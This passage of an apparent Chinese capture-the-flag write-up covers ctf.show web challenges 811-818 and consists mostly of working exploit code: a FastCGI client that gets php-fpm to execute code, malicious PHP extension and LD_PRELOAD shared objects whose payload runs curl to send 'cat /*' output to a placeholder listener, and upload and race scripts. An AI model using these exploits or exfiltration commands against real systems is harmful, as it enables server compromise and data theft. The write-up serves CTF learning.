string\">b''</span>\n        <span class=\"token keyword\">if</span> nameValuePairs<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> nameValuePairs<span class=\"token punctuation\">.</span>items<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                name <span class=\"token operator\">=</span> force_bytes<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span>\n                value <span class=\"token operator\">=</span> force_bytes<span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span>\n                paramsRecord <span class=\"token operator\">+=</span> self<span class=\"token punctuation\">.</span>__encodeNameValueParams<span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">if</span> paramsRecord<span class=\"token punctuation\">:</span>\n            request <span class=\"token operator\">+=</span> self<span class=\"token punctuation\">.</span>__encodeFastCGIRecord<span class=\"token punctuation\">(</span>FastCGIClient<span class=\"token punctuation\">.</span>__FCGI_TYPE_PARAMS<span class=\"token punctuation\">,</span> paramsRecord<span class=\"token punctuation\">,</span> requestId<span class=\"token punctuation\">)</span>\n        request <span class=\"token operator\">+=</span> self<span class=\"token punctuation\">.</span>__encodeFastCGIRecord<span class=\"token punctuation\">(</span>FastCGIClient<span class=\"token punctuation\">.</span>__FCGI_TYPE_PARAMS<span class=\"token punctuation\">,</span> <span class=\"token string\">b''</span><span class=\"token punctuation\">,</span> requestId<span class=\"token punctuation\">)</span>\n\n        <span class=\"token keyword\">if</span> post<span class=\"token punctuation\">:</span>\n            request <span class=\"token operator\">+=</span> self<span class=\"token punctuation\">.</span>__encodeFastCGIRecord<span class=\"token punctuation\">(</span>FastCGIClient<span class=\"token punctuation\">.</span>__FCGI_TYPE_STDIN<span class=\"token punctuation\">,</span> force_bytes<span class=\"token punctuation\">(</span>post<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> requestId<span class=\"token punctuation\">)</span>\n        request <span class=\"token operator\">+=</span> self<span class=\"token punctuation\">.</span>__encodeFastCGIRecord<span class=\"token punctuation\">(</span>FastCGIClient<span class=\"token punctuation\">.</span>__FCGI_TYPE_STDIN<span class=\"token punctuation\">,</span> <span class=\"token string\">b''</span><span class=\"token punctuation\">,</span> requestId<span class=\"token punctuation\">)</span>\n\n        self<span class=\"token punctuation\">.</span>sock<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">)</span>\n        self<span class=\"token punctuation\">.</span>requests<span class=\"token punctuation\">[</span>requestId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'state'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> FastCGIClient<span class=\"token punctuation\">.</span>FCGI_STATE_SEND\n        self<span class=\"token punctuation\">.</span>requests<span class=\"token punctuation\">[</span>requestId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'response'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">b''</span>\n        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>__waitForResponse<span class=\"token punctuation\">(</span>requestId<span class=\"token punctuation\">)</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__waitForResponse</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> requestId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        data <span class=\"token operator\">=</span> <span class=\"token string\">b''</span>\n        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n            buf <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>sock<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">break</span>\n            data <span class=\"token operator\">+=</span> buf\n\n        data <span class=\"token operator\">=</span> BytesIO<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n            response <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>__decodeFastCGIRecord<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> response<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">break</span>\n            <span class=\"token keyword\">if</span> response<span class=\"token punctuation\">[</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> FastCGIClient<span class=\"token punctuation\">.</span>__FCGI_TYPE_STDOUT \\\n                    <span class=\"token keyword\">or</span> response<span class=\"token punctuation\">[</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> FastCGIClient<span class=\"token punctuation\">.</span>__FCGI_TYPE_STDERR<span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">if</span> response<span class=\"token punctuation\">[</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> FastCGIClient<span class=\"token punctuation\">.</span>__FCGI_TYPE_STDERR<span class=\"token punctuation\">:</span>\n                    self<span class=\"token punctuation\">.</span>requests<span class=\"token punctuation\">[</span><span class=\"token string\">'state'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> FastCGIClient<span class=\"token punctuation\">.</span>FCGI_STATE_ERROR\n                <span class=\"token keyword\">if</span> requestId <span class=\"token operator\">==</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">[</span><span class=\"token string\">'requestId'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                    self<span class=\"token punctuation\">.</span>requests<span class=\"token punctuation\">[</span>requestId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'response'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> response<span class=\"token punctuation\">[</span><span class=\"token string\">'content'</span><span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">if</span> response<span class=\"token punctuation\">[</span><span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> FastCGIClient<span class=\"token punctuation\">.</span>FCGI_STATE_SUCCESS<span class=\"token punctuation\">:</span>\n                self<span class=\"token punctuation\">.</span>requests<span class=\"token punctuation\">[</span>requestId<span class=\"token punctuation\">]</span>\n        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>requests<span class=\"token punctuation\">[</span>requestId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'response'</span><span class=\"token punctuation\">]</span>\n\n    <span class=\"token keyword\">def</span> <span class=\"token function\">__repr__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string\">\"fastcgi connect host:{} port:{}\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">)</span>\n\n\n<span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span>\n    parser <span class=\"token operator\">=</span> argparse<span class=\"token punctuation\">.</span>ArgumentParser<span class=\"token punctuation\">(</span>description<span class=\"token operator\">=</span><span class=\"token string\">'Php-fpm code execution vulnerability client.'</span><span class=\"token punctuation\">)</span>\n    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'host'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'Target host, such as 127.0.0.1'</span><span class=\"token punctuation\">)</span>\n    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'A php file absolute path, such as /usr/local/lib/php/System.php'</span><span class=\"token punctuation\">)</span>\n    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-c'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--code'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'What php code your want to execute'</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token string\">'&lt;?php system(\"cat /flagfile\"); exit; ?&gt;'</span><span class=\"token punctuation\">)</span>\n    parser<span class=\"token punctuation\">.</span>add_argument<span class=\"token punctuation\">(</span><span class=\"token string\">'-p'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'--port'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">help</span><span class=\"token operator\">=</span><span class=\"token string\">'FastCGI port'</span><span class=\"token punctuation\">,</span> default<span class=\"token operator\">=</span><span class=\"token number\">28074</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">type</span><span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span>\n\n    args <span class=\"token operator\">=</span> parser<span class=\"token punctuation\">.</span>parse_args<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n    client <span class=\"token operator\">=</span> FastCGIClient<span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">.</span>host<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">.</span>port<span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    params <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    documentRoot <span class=\"token operator\">=</span> <span class=\"token string\">\"/\"</span>\n    uri <span class=\"token operator\">=</span> args<span class=\"token punctuation\">.</span><span class=\"token builtin\">file</span>\n    content <span class=\"token operator\">=</span> args<span class=\"token punctuation\">.</span>code\n    params <span class=\"token operator\">=</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token string\">'GATEWAY_INTERFACE'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'FastCGI/1.0'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'REQUEST_METHOD'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'SCRIPT_FILENAME'</span><span class=\"token punctuation\">:</span> documentRoot <span class=\"token operator\">+</span> uri<span class=\"token punctuation\">.</span>lstrip<span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'SCRIPT_NAME'</span><span class=\"token punctuation\">:</span> uri<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'QUERY_STRING'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'REQUEST_URI'</span><span class=\"token punctuation\">:</span> uri<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'DOCUMENT_ROOT'</span><span class=\"token punctuation\">:</span> documentRoot<span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'SERVER_SOFTWARE'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'php/fcgiclient'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'127.0.0.1'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'REMOTE_PORT'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'9985'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'SERVER_ADDR'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'127.0.0.1'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'SERVER_PORT'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'80'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'SERVER_NAME'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"localhost\"</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'SERVER_PROTOCOL'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'HTTP/1.1'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'CONTENT_TYPE'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'application/text'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'CONTENT_LENGTH'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"%d\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'PHP_VALUE'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'auto_prepend_file = php://input'</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string\">'PHP_ADMIN_VALUE'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'allow_url_include = On'</span>\n    <span class=\"token punctuation\">}</span>\n    response <span class=\"token operator\">=</span> client<span class=\"token punctuation\">.</span>request<span class=\"token punctuation\">(</span>params<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>force_text<span class=\"token punctuation\">(</span>response<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<p>用法：<br/> python exp.py -c ‘&lt;?php system(\"cat /f*\");?&gt;’ -p 28074 pwn.challenge.ctf.show /usr/local/lib/php/System.php</p>\n<p>端口改成自己的就可以了。</p>\n<h2><a id=\"web813_306\"></a>web813</h2>\n<p>大致过程就是自己生成一个mysqli.so（mysqli的扩展），然后扩展里面有ctfshow这个函数。<br/> 题目调用ctfshow函数的时候就会去扩展里面找（php里面没有这个函数）。<br/> 可以采用<a href=\"https://www.php.net/releases/\">php源码</a>中的<code>ext_skel.php</code>来生成。<br/> 一般在ext目录下。<br/> 具体步骤如下：</p>\n<p>1、<code>php ext_skel.php --ext ctfshow --std</code><br/> 运行成功后会在当前目录下生成扩展名目录<br/> 2、进入到目录下，找到.c文件并编辑。<br/> 修改内容有如下两处<br/> <img alt=\"在这里插入图片描述\" src=\"image\\6fc003d92b5443f5b4e40ad7cecdb614.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\22d7be9eab414054afb1cbc5a7d9ff56.png\"/><br/> 3、依次执行如下命令<br/> phpize<br/> ./configure<br/> make &amp;&amp; make install<br/> 生成后告知具体在哪个位置<br/> <img alt=\"在这里插入图片描述\" src=\"image\\44131ae62a5f4cdeb22ffdca8a6619bb.png\"/><br/> 扩展的路径在phpinfo信息中可以看到</p>\n<pre><code class=\"prism language-py\"><span class=\"token keyword\">import</span> requests\nurl<span class=\"token operator\">=</span><span class=\"token string\">\"http://690602f6-e0b4-4a2b-b0e0-b36c4e383275.challenge.ctf.show/\"</span>\ndata<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">'file'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'/usr/local/lib/php/extensions/no-debug-non-zts-20180731/mysqli.so'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'content'</span><span class=\"token punctuation\">:</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ctfshow.so'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\nrequests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">'?a=write'</span><span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\nrequests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">'?a=run'</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<p>还有个预期解的方法，其实就是打9000端口，可以参考下web811</p>\n<h2><a id=\"web814_334\"></a>web814</h2>\n<p>a.c</p>\n<pre><code class=\"prism language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h&gt;</span></span>\n<span class=\"token keyword\">void</span> <span class=\"token function\">payload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"curl http://url:port?s=`cat /*`\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">int</span> <span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LD_PRELOAD\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span> <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>\n        <span class=\"token function\">unsetenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LD_PRELOAD\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">payload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre>\n<p><code>gcc -c -fPIC a.c -o hack&amp;&amp;gcc --share hack -o hack.so</code><br/> 生成恶意so文件</p>\n<pre><code class=\"prism language-py\"><span class=\"token keyword\">import</span> requests\nurl<span class=\"token operator\">=</span><span class=\"token string\">\"http://690602f6-e0b4-4a2b-b0e0-b36c4e383275.challenge.ctf.show/\"</span>\ndata<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">'file'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'/tmp/hack.so'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'content'</span><span class=\"token punctuation\">:</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hack.so'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\nrequests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">'?a=write'</span><span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span>\nrequests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">+</span><span class=\"token string\">'?a=run&amp;env=LD_PRELOAD=/tmp/hack.so'</span><span class=\"token punctuation\">)</span>\n</code></pre>\n<h2><a id=\"web815_361\"></a>web815</h2>\n<p>上一题的方法这题也适用,但是这个题考的是下面这种方式：</p>\n<pre><code class=\"prism language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">_GNU_SOURCE</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h&gt;</span></span>\n<span class=\"token keyword\">extern</span> <span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token operator\">*</span> environ<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">__attribute__</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>__constructor__<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">void</span> <span class=\"token function\">hack</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{<!-- --></span>\n<span class=\"token function\">unsetenv</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LD_PRELOAD\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"curl http://xxx:4567?s=`cat /*`\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre>\n<h2><a id=\"web816_377\"></a>web816</h2>\n<p>生成so文件的方法同上。只不过不能直接上传文件了，但是可以强制上传生成临时文件。<br/> vps开启监听即可。</p>\n<pre><code class=\"prism language-py\"><span class=\"token keyword\">import</span> requests\nurl<span class=\"token operator\">=</span><span class=\"token string\">\"http://cfab7d48-edbe-458a-8314-731989ccfcc1.challenge.ctf.show/?env=LD_PRELOAD=/tmp/\"</span>\nfiles<span class=\"token operator\">=</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token string\">'file'</span><span class=\"token punctuation\">:</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hack.so'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span>\nresponse<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>files<span class=\"token operator\">=</span>files<span class=\"token punctuation\">)</span>\nresponse<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>files<span class=\"token operator\">=</span>files<span class=\"token punctuation\">)</span>\nhtml <span class=\"token operator\">=</span> response<span class=\"token punctuation\">.</span>text\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>html<span class=\"token punctuation\">)</span>\n</code></pre>\n<h2><a id=\"web817_389\"></a>web817</h2>\n<p>同<a href=\"https://blog.csdn.net/miuzzx/article/details/124489107\">群友挑战套娃shell</a></p>\n<h2><a id=\"web818_391\"></a>web818</h2>\n<p>上传一个so文件(so文件可以看下815、814）</p>\n<pre><code class=\"prism language-py\"><span class=\"token comment\"># coding: utf-8</span>\n\n<span class=\"token keyword\">import</span> urllib<span class=\"token punctuation\">.</span>parse\n<span class=\"token keyword\">import</span>  threading<span class=\"token punctuation\">,</span> requests\n<span class=\"token keyword\">import</span> socket\n<span class=\"token keyword\">import</span> re\nport<span class=\"token operator\">=</span> <span class=\"token number\">28133</span>\ns<span class=\"token operator\">=</span>socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ns<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.challenge.ctf.show'</span><span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ns<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'''GET / HTTP/1.1\nHost:127.0.0.1\n\n\t'''</span></span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ndata<span class=\"token operator\">=</span>s<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\ns<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npid <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>findall<span class=\"token punctuation\">(</span><span class=\"token string\">'(.*?) www-data'</span><span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>pid<span class=\"token punctuation\">)</span>\nl<span class=\"token operator\">=</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hack.so'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\n'</span><span class=\"token operator\">*</span><span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">upload</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n\t\ts<span class=\"token operator\">=</span>socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\ts<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.challenge.ctf.show'</span><span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\t\n\t\tx<span class=\"token operator\">=</span><span class=\"token triple-quoted-string string\">b'''POST / HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: yu22x\nContent-Length: '''</span><span class=\"token operator\">+</span>l<span class=\"token operator\">+</span><span class=\"token triple-quoted-string string\">b'''\nContent-Type: application/x-www-form-urlencoded\nConnection: close\n\n'''</span><span class=\"token operator\">+</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hack.so'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\n'</span><span class=\"token operator\">*</span><span class=\"token number\">1024</span><span class=\"token operator\">*</span><span class=\"token number\">200</span><span class=\"token operator\">+</span><span class=\"token triple-quoted-string string\">b'''\n\n'''</span>\n\t\ts<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span>\n\t\ts<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">bruter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n\t\t<span class=\"token keyword\">for</span> fd <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n\t\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span>\n\t\t\ts<span class=\"token operator\">=</span>socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\t\t\ts<span class=\"token punctuation\">.</span>connect<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.challenge.ctf.show'</span><span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t\t\ts<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'''GET /?env=LD_PRELOAD=/proc/</span><span class=\"token interpolation\"><span class=\"token punctuation\">{<!-- 